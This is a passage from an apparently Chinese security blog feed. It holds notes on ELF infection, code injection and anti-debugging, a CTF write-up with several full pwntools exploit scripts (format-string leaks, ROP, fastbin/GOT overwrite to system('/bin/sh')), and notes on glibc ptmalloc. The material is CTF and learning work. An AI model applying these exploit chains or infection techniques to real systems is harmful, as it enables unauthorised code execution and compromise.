title="直接PLT感染"></a>直接PLT感染</h3><p>修改PLT代码，使其存放一条完全不同的指令来改变控制流。</p><h3 id="函数蹦床"><a href="#函数蹦床" class="headerlink" title="函数蹦床"></a>函数蹦床</h3><p>使用某种能够改变控制流的分支指令重写函数代码的前5~7个字节。重写完后调用的的即为要想调用的函数。</p><h3 id="重写-ctors-dtors函数指针"><a href="#重写-ctors-dtors函数指针" class="headerlink" title="重写.ctors/.dtors函数指针"></a>重写.ctors/.dtors函数指针</h3><p>.ctors/.init_array 函数指针会在 main()函数调用之前触发。这就意味着，可以通过重写某个指向正确地址的指针来将控制流指向病毒或者寄生代码。.dtors/.fini_array 函数指针在 main()函数执行完之后才被触发。</p><h3 id="GOT感染或PLT-GOT重定向"><a href="#GOT感染或PLT-GOT重定向" class="headerlink" title="GOT感染或PLT/GOT重定向"></a>GOT感染或PLT/GOT重定向</h3><p>相关论文： Modern Day ELF Runtime infection via GOT poisoning（<a href="http://vxheaven.org/lib/vrn00.html）" target="_blank" rel="noopener">http://vxheaven.org/lib/vrn00.html）</a></p><h3 id="感染数据结构"><a href="#感染数据结构" class="headerlink" title="感染数据结构"></a>感染数据结构</h3><h3 id="函数指针重写"><a href="#函数指针重写" class="headerlink" title="函数指针重写"></a>函数指针重写</h3><h2 id="进程内存病毒和rootkits——远程代码注入技术"><a href="#进程内存病毒和rootkits——远程代码注入技术" class="headerlink" title="进程内存病毒和rootkits——远程代码注入技术"></a>进程内存病毒和rootkits——远程代码注入技术</h2><h3 id="共享库注入"><a href="#共享库注入" class="headerlink" title="共享库注入"></a>共享库注入</h3><h4 id="so感染-ET-DYN感染"><a href="#so感染-ET-DYN感染" class="headerlink" title=".so感染/ET_DYN感染"></a>.so感染/ET_DYN感染</h4><p>这项技术可以用来将一个共享库注入到已存在的进程地址空间中，注入共享库后，需要通过PLT/GOT重定向、函数蹦床等将控制流使用前面的感染点之一重定向到共享库。</p><h5 id="so感染——使用LD-PRELOAD"><a href="#so感染——使用LD-PRELOAD" class="headerlink" title=".so感染——使用LD_PRELOAD"></a>.so感染——使用LD_PRELOAD</h5><p>通过设置LD_PRELOAD环境变量，将我们想要的共享库放在其他共享库之前加载。</p><h5 id="so感染——利用open-mmap"><a href="#so感染——利用open-mmap" class="headerlink" title=".so感染——利用open()/mmap()"></a>.so感染——利用open()/mmap()</h5><p>通过往已存在的进程的text段注入shellcode，并执行shellcode。利用共享库的open/mmap操作，将任何文件注入到进程的地址空间中。</p><h5 id="so感染——利用dloen"><a href="#so感染——利用dloen" class="headerlink" title=".so感染——利用dloen()"></a>.so感染——利用dloen()</h5><p>程序可以通过dlopen()/_libc_dlopen_mode()函数凭空加载一个共享库。</p><p>但在使用_libc_dlopen_mode()之前，要先得到想要感染进程中的libc基址，解析_libc_dlopen_mode()的符号，然后将符号值st_value与libc相加得到最终地址。</p><h5 id="so感染——使用vdso控制技术"><a href="#so感染——使用vdso控制技术" class="headerlink" title=".so感染——使用vdso控制技术"></a>.so感染——使用vdso控制技术</h5><h3 id="text段代码注入"><a href="#text段代码注入" class="headerlink" title="text段代码注入"></a>text段代码注入</h3><h3 id="可执行文件注入"><a href="#可执行文件注入" class="headerlink" title="可执行文件注入"></a>可执行文件注入</h3><p>elfdemon： <a href="http://www.bitlackeys.org/projects/elfdemon.tgz" target="_blank" rel="noopener">http://www.bitlackeys.org/projects/elfdemon.tgz</a></p><h3 id="重定位代码注入——ET-REL注入"><a href="#重定位代码注入——ET-REL注入" class="headerlink" title="重定位代码注入——ET_REL注入"></a>重定位代码注入——ET_REL注入</h3><h2 id="ELF反调试和封装技术"><a href="#ELF反调试和封装技术" class="headerlink" title="ELF反调试和封装技术"></a>ELF反调试和封装技术</h2><h3 id="PTRACE-TRACEME技术"><a href="#PTRACE-TRACEME技术" class="headerlink" title="PTRACE_TRACEME技术"></a>PTRACE_TRACEME技术</h3><p>进程追踪有一个特性：一个程序在同一时间只能被一个进程追踪。</p><p>这项技术的思路就是让程序追踪自身，这样调试器就无法附加到该进程了。</p><h3 id="SIGTRAP处理技术"><a href="#SIGTRAP处理技术" class="headerlink" title="SIGTRAP处理技术"></a>SIGTRAP处理技术</h3><p>使用这项技术，程序可以设置一个信号处理器来捕获SIGTRAP信号，然后故意发出一个断点指令，信号处理器捕捉到SIGTRAP信号后，会将一个全局变量从0加到1。随后检查这个全局变量，如果为1，则说明未被调试；如果为0，说明正在被调试，为了防止被调试，可以终止进程或者退出。</p><h3 id="proc-self-status技术"><a href="#proc-self-status技术" class="headerlink" title="/proc/self/status技术"></a>/proc/self/status技术</h3><p>/proc/self/status中的”TracerPid”对应值0表示没用被追踪，如果不为0，则表明正在被追踪。</p><h3 id="代码混淆技术"><a href="#代码混淆技术" class="headerlink" title="代码混淆技术"></a>代码混淆技术</h3><p>通过修改汇编层的代码来引入不明确的分支指令或者未对其指令，使得反汇编程序无法正确地读取字节码文件。</p><h3 id="字符串表转换技术"><a href="#字符串表转换技术" class="headerlink" title="字符串表转换技术"></a>字符串表转换技术</h3><p>这项技术会打乱每个符号名和节相关信息的顺序，以致可能出现的结果就是所有的节头、函数名和符号名看上去都是乱序混在一起的。</p><p>相关代码：<a href="http://www.bitlackeys.org/projects/elfscure.c" target="_blank" rel="noopener">http://www.bitlackeys.org/projects/elfscure.c</a> </p><h2 id="ELF病毒检测和杀毒"><a href="#ELF病毒检测和杀毒" class="headerlink" title="ELF病毒检测和杀毒"></a>ELF病毒检测和杀毒</h2><p>VMA Voodoo（<a href="http://www.bitlackeys.org/#vmavudu）" target="_blank" rel="noopener">http://www.bitlackeys.org/#vmavudu）</a><br>AVU(Anti Virus UNIX）：<a href="http://www.bitlackeys.org/projects/avu32.tgz" target="_blank" rel="noopener">http://www.bitlackeys.org/projects/avu32.tgz</a></p><h1 id="Linux二进制保护"><a href="#Linux二进制保护" class="headerlink" title="Linux二进制保护"></a>Linux二进制保护</h1><h2 id="ELF二进制加壳器"><a href="#ELF二进制加壳器" class="headerlink" title="ELF二进制加壳器"></a>ELF二进制加壳器</h2><p>加壳器：用来对可执行文件进行压缩或加密，来对代码和数据进行混淆。</p><h2 id="存根机制和用户层执行"><a href="#存根机制和用户层执行" class="headerlink" title="存根机制和用户层执行"></a>存根机制和用户层执行</h2><p>软件保护器由以下两个程序组成：保护阶段的代码（应用到目标二进制文件上的保护程序）、运行时引擎或存根（与目标二进制文件合并在一起，负责运行时反混淆和反调试的程序。）</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;Linux环境和相关工具&quot;&gt;&lt;a href=&quot;#Linux环境和相关工具&quot; class=&quot;headerlink&quot; title=&quot;Linux环境和相关工具&quot;&gt;&lt;/a&gt;Linux环境和相关工具&lt;/h1&gt;&lt;h2 id=&quot;Linux工具&quot;&gt;&lt;a href=&quot;#Linux工
      
    
    </summary>
    
    
      <category term="笔记" scheme="https://nuoye-blog.github.io/categories/%E7%AC%94%E8%AE%B0/"/>
    
    
      <category term="笔记" scheme="https://nuoye-blog.github.io/tags/%E7%AC%94%E8%AE%B0/"/>
    
      <category term="linux" scheme="https://nuoye-blog.github.io/tags/linux/"/>
    
      <category term="elf" scheme="https://nuoye-blog.github.io/tags/elf/"/>
    
  </entry>
  
  <entry>
    <title>2019第五空间线上初赛-WP</title>
    <link href="https://nuoye-blog.github.io/2020/05/09/wp/2019%E7%AC%AC%E4%BA%94%E7%A9%BA%E9%97%B4%E7%BA%BF%E4%B8%8A%E5%88%9D%E8%B5%9B/wp/"/>
    <id>https://nuoye-blog.github.io/2020/05/09/wp/2019%E7%AC%AC%E4%BA%94%E7%A9%BA%E9%97%B4%E7%BA%BF%E4%B8%8A%E5%88%9D%E8%B5%9B/wp/</id>
    <published>2020-05-08T16:00:00.000Z</published>
    <updated>2020-05-08T17:25:42.252Z</updated>
    
    <content type="html"><![CDATA[<h3 id="BF"><a href="#BF" class="headerlink" title="BF"></a>BF</h3><p>首先覆盖掉seed，去掉rand()的随机化，然后通过输入的name进行格式化字符的泄漏，再通过rop串leak出libc_base，最后直接用one_gadgets getshell,exp如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">a=[<span class="number">7427</span>,<span class="number">39356</span>,<span class="number">9595</span>,<span class="number">54062</span>,<span class="number">67371</span>,<span class="number">42578</span>,<span class="number">92585</span>,<span class="number">76990</span>,<span class="number">22615</span>,<span class="number">53318</span>,<span class="number">12615</span>]</span><br><span class="line"><span class="comment">#p = process('./bf')</span></span><br><span class="line">pop_rdi = <span class="number">0xdb3</span></span><br><span class="line">p = remote(<span class="string">'111.33.164.4'</span>,<span class="number">50001</span>)</span><br><span class="line">p.sendline(<span class="string">'1'</span>)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">'name : '</span>,<span class="string">'%17$p%23$p'</span>+<span class="string">'a'</span>*<span class="number">18</span>+p64(<span class="number">0</span>))</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">10</span>):</span><br><span class="line">p.sendlineafter(<span class="string">'guess:'</span>,str(a[i]))</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">'0x'</span>)</span><br><span class="line">canary = int(p.recv(<span class="number">16</span>),<span class="number">16</span>)</span><br><span class="line">p.recvuntil(<span class="string">'0x'</span>)</span><br><span class="line">vmmap = int(p.recv(<span class="number">12</span>),<span class="number">16</span>) - <span class="number">0xabf</span></span><br><span class="line">p.sendline(<span class="string">'a'</span>*<span class="number">0x34</span>+p64(canary)+p64(<span class="number">0</span>)+p64(vmmap+pop_rdi)+p64(vmmap+<span class="number">0x202018</span>)+p64(vmmap+<span class="number">0x8A0</span>)+p64(vmmap+<span class="number">0XAbf</span>))</span><br><span class="line"></span><br><span class="line">p.recv(<span class="number">4</span>)</span><br><span class="line">puts_addr= u64(p.recv(<span class="number">6</span>)+<span class="string">'\x00\x00'</span>)</span><br><span class="line"><span class="keyword">print</span> hex(puts_addr)</span><br><span class="line">obj = LibcSearcher(<span class="string">'puts'</span>,puts_addr)</span><br><span class="line">libc_base = puts_addr - obj.dump(<span class="string">'puts'</span>)</span><br><span class="line"><span class="keyword">print</span> hex(libc_base)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.sendline(<span class="string">'1'</span>)</span><br><span class="line">p.sendlineafter(<span class="string">'name : '</span>,<span class="string">'a'</span>*<span class="number">28</span>+p64(<span class="number">0</span>))</span><br><span class="line"><span class="keyword">print</span> hex(vmmap+<span class="number">0x202018</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">10</span>):</span><br><span class="line">p.sendlineafter(<span class="string">'guess:'</span>,str(a[i]))</span><br><span class="line">p.sendline(<span class="string">'b'</span>*<span class="number">0x34</span>+p64(canary)+p64(<span class="number">0</span>)+p64(libc_base+<span class="number">0x41320</span>))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="pwn7"><a href="#pwn7" class="headerlink" title="pwn7"></a>pwn7</h2><p>edit函数堆溢出，通过改fd破坏fastbin，申请到notes数组附近，利用了stderr高位是0x7f绕过check。然后把第0个格改为puts@got，show(0)来leak libc，再把第0个格改为atoi@got，edit(0)改为system，然后在传choice时传/bin/sh即可getshell。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">'./pwn'</span>)</span><br><span class="line">p = remote(<span class="string">'111.33.164.4'</span>,<span class="number">50007</span>)</span><br><span class="line">elf= ELF(<span class="string">'./pwn'</span>)</span><br><span class="line">libc = elf.libc</span><br><span class="line">context.log_level=<span class="string">'debug'</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(size)</span>:</span></span><br><span class="line">p.recvuntil(<span class="string">'choice &gt;&gt;'</span>)</span><br><span class="line">p.sendline(<span class="string">'1'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'size:'</span>)</span><br><span class="line">p.sendline(str(size))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(index)</span>:</span></span><br><span class="line">p.recvuntil(<span class="string">'choice &gt;&gt;'</span>)</span><br><span class="line">p.sendline(<span class="string">'2'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'id:'</span>)</span><br><span class="line">p.sendline(str(index))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(index,size,content)</span>:</span></span><br><span class="line">p.recvuntil(<span class="string">'choice &gt;&gt;'</span>)</span><br><span class="line">p.sendline(<span class="string">'3'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'id:'</span>)</span><br><span class="line">p.sendline(str(index))</span><br><span class="line">p.recvuntil(<span class="string">'size:'</span>)</span><br><span class="line">p.sendline(str(size))</span><br><span class="line">p.recvuntil(<span class="string">'content:'</span>)</span><br><span class="line">p.sendline(content)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dell</span><span class="params">(index)</span>:</span></span><br><span class="line">p.recvuntil(<span class="string">'choice &gt;&gt;'</span>)</span><br><span class="line">p.sendline(<span class="string">'4'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'id:'</span>)</span><br><span class="line">p.sendline(str(index))</span><br><span class="line"><span class="comment">#gdb.attach(p,'b *0x400cea')</span></span><br><span class="line">add(<span class="number">0x80</span>)<span class="comment">#0</span></span><br><span class="line">add(<span class="number">0x80</span>)<span class="comment">#1</span></span><br><span class="line">dell(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">0x80</span>)<span class="comment">#0</span></span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">p.recvuntil(<span class="string">'data:'</span>)</span><br><span class="line">libc_base1 = u64(p.recv(<span class="number">6</span>)+<span class="string">'\x00\x00'</span>)<span class="number">-0x3C4B78</span></span><br><span class="line"><span class="keyword">print</span> hex(libc_base1)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x60</span>)<span class="comment">#2</span></span><br><span class="line">add(<span class="number">0x60</span>)<span class="comment">#3</span></span><br><span class="line">dell(<span class="number">3</span>)</span><br><span class="line">edit(<span class="number">2</span>,<span class="number">0x80</span>,<span class="string">'a'</span>*<span class="number">0x68</span>+p64(<span class="number">0x7f</span>)+p64(<span class="number">0x6020bd</span>))</span><br><span class="line"></span><br><span class="line">one=[<span class="number">0x45216</span>,<span class="number">0x4526a</span>,<span class="number">0xf02a4</span>,<span class="number">0xf1147</span>]</span><br><span class="line">add(<span class="number">0x60</span>)<span class="comment">#3</span></span><br><span class="line">add(<span class="number">0x60</span>)<span class="comment">#4</span></span><br><span class="line">edit(<span class="number">4</span>,<span class="number">0x20</span>,<span class="string">'a'</span>*<span class="number">0x13</span>+p64(<span class="number">0x602020</span>))</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">'data:'</span>)</span><br><span class="line"></span><br><span class="line">puts_addr = u64(p.recv(<span class="number">6</span>)+<span class="string">'\x00\x00'</span>)</span><br><span class="line">obj = LibcSearcher(<span class="string">'puts'</span>,puts_addr)</span><br><span class="line">libc_base = puts_addr - obj.dump(<span class="string">'puts'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> hex(libc_base)</span><br><span class="line">edit(<span class="number">1</span>,<span class="number">10</span>,<span class="string">'/bin/sh\x00'</span>)</span><br><span class="line">edit(<span class="number">4</span>,<span class="number">0x20</span>,<span class="string">'a'</span>*<span class="number">0x13</span>+p64(<span class="number">0x602068</span>))</span><br><span class="line">edit(<span class="number">0</span>,<span class="number">0x20</span>,p64(libc_base+obj.dump(<span class="string">'system'</span>)))</span><br><span class="line">p.recvuntil(<span class="string">'choice &gt;&gt;'</span>)</span><br><span class="line">p.sendline(<span class="string">'/bin/sh\x00'</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="pwn11"><a href="#pwn11" class="headerlink" title="pwn11"></a>pwn11</h2><p>首先通过00截断绕过strcmp函数，然后就是栈溢出泄漏libc再getshell了。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#p = process('./pwn11')</span></span><br><span class="line">p = remote(<span class="string">'111.33.164.4'</span>,<span class="number">50011</span>)</span><br><span class="line">elf = ELF(<span class="string">'./pwn11'</span>)</span><br><span class="line">pop_rdi = <span class="number">0x4012ab</span></span><br><span class="line">main = <span class="number">0x401162</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.sendline(<span class="string">'nuoye'</span>)</span><br><span class="line">p.sendline(<span class="string">'abcd\x00'</span>+<span class="string">'a'</span>*<span class="number">0x1b</span>+p64(<span class="number">0</span>)+p64(pop_rdi)+p64(elf.got[<span class="string">'read'</span>])+p64(elf.plt[<span class="string">'puts'</span>])+p64(main))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">'ok!\n'</span>)</span><br><span class="line">read_addr = u64(p.recv(<span class="number">6</span>)+<span class="string">'\x00\x00'</span>)</span><br><span class="line">obj = LibcSearcher(<span class="string">'read'</span>,read_addr)</span><br><span class="line">libc_base = read_addr-obj.dump(<span class="string">'read'</span>)</span><br><span class="line"><span class="keyword">print</span> hex(libc_base)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.sendline(<span class="string">'nuoye'</span>)</span><br><span class="line">p.sendline(<span class="string">'abcd\x00'</span>+<span class="string">'a'</span>*<span class="number">0x1b</span>+p64(<span class="number">0</span>)+p64(pop_rdi)+p64(libc_base+obj.dump(<span class="string">'str_bin_sh'</span>))+p64(libc_base+obj.dump(<span class="string">'system'</span>))+p64(main))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="pwn13"><a href="#pwn13" class="headerlink" title="pwn13"></a>pwn13</h2><p>简单的栈溢出，可以看到有后门，开了PIE而已，所以覆盖下最低位即可。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#p = process('./pwn13')</span></span><br><span class="line">p = remote(<span class="string">'111.33.164.4'</span>,<span class="number">50013</span>)</span><br><span class="line">p.sendline(<span class="string">'1'</span>)</span><br><span class="line">p.send(<span class="string">'a'</span>*<span class="number">0x27</span>+<span class="string">'b'</span>+<span class="string">'\x50'</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;BF&quot;&gt;&lt;a href=&quot;#BF&quot; class=&quot;headerlink&quot; title=&quot;BF&quot;&gt;&lt;/a&gt;BF&lt;/h3&gt;&lt;p&gt;首先覆盖掉seed，去掉rand()的随机化，然后通过输入的name进行格式化字符的泄漏，再通过rop串leak出libc_base，最后直
      
    
    </summary>
    
    
      <category term="WP" scheme="https://nuoye-blog.github.io/categories/WP/"/>
    
    
      <category term="ctf" scheme="https://nuoye-blog.github.io/tags/ctf/"/>
    
      <category term="WP" scheme="https://nuoye-blog.github.io/tags/WP/"/>
    
  </entry>
  
  <entry>
    <title>《ptmalloc》</title>
    <link href="https://nuoye-blog.github.io/2020/05/09/%E7%AC%94%E8%AE%B0/ptmalloc/ptmalloc/"/>
    <id>https://nuoye-blog.github.io/2020/05/09/%E7%AC%94%E8%AE%B0/ptmalloc/ptmalloc/</id>
    <published>2020-05-08T16:00:00.000Z</published>
    <updated>2020-05-08T17:27:09.066Z</updated>
    
    <content type="html"><![CDATA[<h1 id="glibc"><a href="#glibc" class="headerlink" title="glibc"></a>glibc</h1><h2 id="内存管理的方法"><a href="#内存管理的方法" class="headerlink" title="内存管理的方法"></a>内存管理的方法</h2><h3 id="c风格的内存管理程序"><a href="#c风格的内存管理程序" class="headerlink" title="c风格的内存管理程序"></a>c风格的内存管理程序</h3><h3 id="池式内存管理"><a href="#池式内存管理" class="headerlink" title="池式内存管理"></a>池式内存管理</h3><p>内存池是一种半内存管理方法。内存池帮助某些程序进行自动内存管理，这些程序会经历一些特定的阶段，而且每个阶段中都有分配给进程的特定阶段内存。</p><h3 id="引用计数"><a href="#引用计数" class="headerlink" title="引用计数"></a>引用计数</h3><h3 id="垃圾收集"><a href="#垃圾收集" class="headerlink" title="垃圾收集"></a>垃圾收集</h3><p>收集器没有找到的就是垃圾，可以被销毁并重新使用这些无用数据</p><h2 id="内存管理器的设计目标"><a href="#内存管理器的设计目标" class="headerlink" title="内存管理器的设计目标"></a>内存管理器的设计目标</h2><h3 id="最大化兼容性"><a href="#最大化兼容性" class="headerlink" title="最大化兼容性"></a>最大化兼容性</h3><h3 id="最大化可移植性"><a href="#最大化可移植性" class="headerlink" title="最大化可移植性"></a>最大化可移植性</h3><h3 id="浪费最小的空间"><a href="#浪费最小的空间" class="headerlink" title="浪费最小的空间"></a>浪费最小的空间</h3><h3 id="最快的速度"><a href="#最快的速度" class="headerlink" title="最快的速度"></a>最快的速度</h3><h3 id="最大化可调度性（以适应不同的情况）"><a href="#最大化可调度性（以适应不同的情况）" class="headerlink" title="最大化可调度性（以适应不同的情况）"></a>最大化可调度性（以适应不同的情况）</h3><h3 id="最大化局部性-Locality"><a href="#最大化局部性-Locality" class="headerlink" title="最大化局部性(Locality)"></a>最大化局部性(Locality)</h3><h3 id="最大化调试功能"><a href="#最大化调试功能" class="headerlink" title="最大化调试功能"></a>最大化调试功能</h3><h3 id="最大化适应性"><a href="#最大化适应性" class="headerlink" title="最大化适应性"></a>最大化适应性</h3><h2 id="常见c内存管理程序"><a href="#常见c内存管理程序" class="headerlink" title="常见c内存管理程序"></a>常见c内存管理程序</h2><h3 id="Doug-Lea-Malloc"><a href="#Doug-Lea-Malloc" class="headerlink" title="Doug Lea Malloc"></a>Doug Lea Malloc</h3><h3 id="BSD-Malloc"><a href="#BSD-Malloc" class="headerlink" title="BSD Malloc"></a>BSD Malloc</h3><h3 id="Hoard"><a href="#Hoard" class="headerlink" title="Hoard"></a>Hoard</h3><h3 id="TCMalloc"><a href="#TCMalloc" class="headerlink" title="TCMalloc"></a>TCMalloc</h3><h2 id="chunk的结构"><a href="#chunk的结构" class="headerlink" title="chunk的结构"></a>chunk的结构</h2><h3 id="chunk格式"><a href="#chunk格式" class="headerlink" title="chunk格式"></a>chunk格式</h3><h4 id="使用中："><a href="#使用中：" class="headerlink" title="使用中："></a>使用中：</h4><p><img src="./png/using-chunk.jpg" alt="using-chunk"></p><p>P：为0时表示前一个chunk空闲，这时prev_size才有效</p><p>​      为1时表示前一个chunk正在使用中，prev_size无效</p><p>M：为1表示该chunk从mmap映射区域分配，否则是从heap区域分配</p><p>A：如果为1表示该chunk属于非主分配区，否则置为0</p><h4 id="free后："><a href="#free后：" class="headerlink" title="free后："></a>free后：</h4><p><img src="./png/freed-chunk.jpg" alt="using-chunk"></p><p>fd：指向后一个空闲指针</p><p>bk：指向前一个空闲指针</p><p>若为large bin，则多含有fd_nextsize和bk_nextsize，用于加快large bin查找最近匹配的空闲chunk</p><h2 id="bins"><a href="#bins" class="headerlink" title="bins"></a>bins</h2><h4 id="small-bin"><a href="#small-bin" class="headerlink" title="small bin"></a>small bin</h4><p>free后p位置0，同时检查相邻的chunk，若空闲则合并</p><h4 id="fast-bin"><a href="#fast-bin" class="headerlink" title="fast bin"></a>fast bin</h4><p>free后p位不置0，不合并chunk，但在一定条件下fastbin会合并（如分配large bin，详见<a href="http://blog.chinaunix.net/uid-27767798-id-4107020.html）。" target="_blank" rel="noopener">http://blog.chinaunix.net/uid-27767798-id-4107020.html）。</a></p><h4 id="unsorted-bin"><a href="#unsorted-bin" class="headerlink" title="unsorted bin"></a>unsorted bin</h4><p>使用bins数组的第一个，如果被用户释放的chunk大于max_fast或者fastbins中的空闲chunk合并后，这些chunk首先会放入unsort bin队列中。分配时若在fastbins中未找到合适的chunk，会优先在unsort bins中查找空闲的chunk，然后才查找bins。如果unsort bins不满足分配要求，malloc便会将unsort bin中的chunk加入bins，然后从bins中继续进行查找和分配过程。</p><h4 id="Top-chunk"><a href="#Top-chunk" class="headerlink" title="Top chunk"></a>Top chunk</h4><p>在分配时总是在fastbins和bins之后考虑，分主分配区和非主分配区两种考虑</p><h4 id="mmaped-chunk"><a href="#mmaped-chunk" class="headerlink" title="mmaped chunk"></a>mmaped chunk</h4><p>直接mmap申请的内存，释放时直接将内存归还操作系统，不会进入任何bin中</p><h4 id="Last-remainder"><a href="#Last-remainder" class="headerlink" title="Last remainder"></a>Last remainder</h4><p>当需要分配一个small chunk，但在small bins中找不到合适的chunk时，如果last remainder chunk的大小大于所需的small chunk大小，last remainder chunk被分裂成两个chunk，其中一个chunk返回给用户，另一个chunk变成新的last remainder chunk。</p><h4 id="分配时查找顺序"><a href="#分配时查找顺序" class="headerlink" title="分配时查找顺序"></a>分配时查找顺序</h4><p>查找fast bins–&gt;查找small bins–&gt;合并fast bins，并入unsort bins，查找unsort bin–&gt;把unsort bin全加入large bins中，查找large bins–&gt;考虑top chunk</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;glibc&quot;&gt;&lt;a href=&quot;#glibc&quot; class=&quot;headerlink&quot; title=&quot;glibc&quot;&gt;&lt;/a&gt;glibc&lt;/h1&gt;&lt;h2 id=&quot;内存管理的方法&quot;&gt;&lt;a href=&quot;#内存管理的方法&quot; class=&quot;headerlink&quot; title=
      
    
    </summary>
    
    
      <category term="笔记" scheme="https://nuoye-blog.github.io/categories/%E7%AC%94%E8%AE%B0/"/>
    
    
      <category term="glibc" scheme="https://nuoye-blog.github.io/tags/glibc/"/>
    
      <category term="笔记" scheme="https://nuoye-blog.github.io/tags/%E7%AC%94%E8%AE%B0/"/>
    
      <category term="linux" scheme="https://nuoye-blog.github.io/tags/linux/"/>
    
  </entry>
  
  <entry>
    <title>64位shellcode编写</title>
    <link href="https://nuoye-blog.github.io/2020/05/09/%E6%96%87%E7%AB%A0/shellcode/64%E4%BD%8Dshellcode%E7%BC%96%E5%86%99/"/>
    <id>https://nuoye-blog.github.io/2020/05/09/%E6%96%87%E7%AB%A0/shellcode/64%E4%BD%8Dshellcode%E7%BC%96%E5%86%99/</id>
    <published>2020-05-08T16:00:00.000Z</published>
